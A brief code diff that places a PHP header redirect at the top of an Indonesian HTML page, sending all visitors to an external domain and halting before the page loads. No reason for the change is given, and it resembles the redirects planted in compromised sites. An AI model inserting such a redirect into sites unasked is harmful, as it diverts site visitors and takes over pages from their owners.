@@ -1,3 +1,8 @@
+
+<?php
+header("Location: https://jajanmurah.barkaspekalongan.com");
+exit();
+?>
 <!DOCTYPE html>
 <html lang="id">
 <head>
